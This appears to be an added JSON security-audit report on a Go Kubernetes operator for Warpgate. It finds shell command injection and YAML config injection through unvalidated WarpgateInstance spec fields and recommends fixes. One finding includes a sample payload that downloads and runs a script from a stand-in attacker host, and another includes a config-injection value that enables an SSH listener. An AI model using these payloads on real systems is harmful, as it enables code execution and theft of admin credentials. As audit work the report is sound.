@@ -1,0 +1,52 @@
+{
+  "summary": "Reviewed the warpgate-operator Go sources under internal/ (warpgate API client + controllers), cmd/main.go, and api/v1alpha1 (types and admission webhooks). The operator is a Kubernetes controller that reconciles WarpgateInstance/Connection/Target/User/Ticket/etc. CRs against a Warpgate admin API. The most significant issue is that the WarpgateInstance reconciler builds a `/bin/sh -c` init script by string-concatenating unvalidated CR spec fields (notably spec.databaseURL), yielding shell command injection into the instance pod; the same untrusted fields are also injected unescaped into the generated warpgate.yaml. Credential/secret handling, TLS defaults, and the API client are otherwise reasonable. Coverage was the non-test Go files listed below; test files were only skimmed.",
+  "coverage": [
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/parameters.go",
+    "internal/warpgate/bindings.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/ticket.go",
+    "internal/warpgate/target_group.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgatetarget_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "api/v1alpha1/warpgateinstance_webhook.go",
+    "api/v1alpha1/warpgateconnection_webhook.go",
+    "api/v1alpha1/warpgateinstance_types.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via spec.databaseURL in WarpgateInstance init script",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles an init-container command as a single `/bin/sh -c <script>` string (see Command at line 776). User-controlled WarpgateInstance spec fields are concatenated into that script without any shell escaping. spec.databaseURL is inserted as `--database-url \"<value>\"` at line 557; the admission webhook (validateWarpgateInstance) performs no content validation on databaseURL (it only emits a warning), so a principal allowed to create/update a WarpgateInstance CR can set databaseURL to e.g. `x\"; wget http://attacker/x -O /tmp/x; sh /tmp/x; echo \"` and achieve arbitrary command execution inside the Warpgate instance pod. That pod has the admin password wired in as the ADMIN_PASSWORD env var and mounts the pod's ServiceAccount token, so injection leaks the Warpgate admin credential and the pod's Kubernetes identity \u2014 an escalation beyond what merely creating an instance grants. The same concatenation pattern applies to other spec-derived fragments in this block, but databaseURL is the clearest attacker-controlled free-text sink.",
+      "evidence": "Line 549-558: setupCmd := fmt.Sprintf(`warpgate ... --admin-password \"${ADMIN_PASSWORD}\"`, ...); if inst.Spec.DatabaseURL != \"\" { setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) }. Line 570: scriptParts append fmt.Sprintf(\"  %s\", setupCmd). Line 611: initScript := strings.Join(scriptParts, \"\\n\"). Line 776: Command: []string{\"/bin/sh\", \"-c\", initScript}. Source: WarpgateInstanceSpec.DatabaseURL (api/v1alpha1/warpgateinstance_types.go:86), a free-form string with no validation in warpgateinstance_webhook.go.",
+      "recommendation": "Do not build the shell command by interpolating spec values. Pass user-controlled values as argv elements (e.g. exec `warpgate ...` with the database URL as a discrete arg, or via an env var referenced as \"$DATABASE_URL\" that the shell expands but does not re-parse) instead of embedding them in the script text. At minimum, strictly validate databaseURL (and externalHost, storage size, etc.) against an allow-list/regex in the validating webhook and reject shell metacharacters."
+    },
+    {
+      "title": "YAML config injection via spec.databaseURL / spec.externalHost in generated warpgate.yaml",
+      "category": "security",
+      "cwe": "CWE-91",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 344,
+      "line_end": 381,
+      "description": "buildWarpgateConfig produces warpgate.yaml by fmt.Fprintf-ing raw spec strings into the document. spec.databaseURL is written as `database_url: \"<value>\"` (line 345) and spec.externalHost as `external_host: <value>` (line 380), with no escaping and no webhook validation. A value containing a newline (e.g. externalHost = \"h\\nssh:\\n  enable: true\\n  listen: \\\"0.0.0.0:2222\\\"\") lets a WarpgateInstance author inject or override arbitrary top-level Warpgate configuration keys. This ConfigMap is copied to /data/warpgate.yaml and consumed by the running instance (line 587), so injected keys take effect and can weaken the instance's security posture (e.g. enabling listeners or altering auth-related settings). Same root cause as the command-injection finding \u2014 unvalidated free-text spec fields \u2014 but a distinct sink (the config file) with a different fix.",
+      "evidence": "Line 344-345: if inst.Spec.DatabaseURL != \"\" { fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL) }. Line 379-381: if inst.Spec.ExternalHost != \"\" { fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost) }. Rendered config is stored in the ConfigMap (ensureConfigMap, line 401-403) and copied over /data/warpgate.yaml by the init script (line 587).",
+      "recommendation": "Serialize the config with a real YAML encoder (e.g. sigs.k8s.io/yaml or gopkg.in/yaml.v3) from a typed struct/map rather than hand-formatting strings, so values are properly quoted/escaped. Additionally validate externalHost (hostname) and databaseURL (URL scheme/format) in the validating webhook and reject embedded newlines."
+    }
+  ]
+}
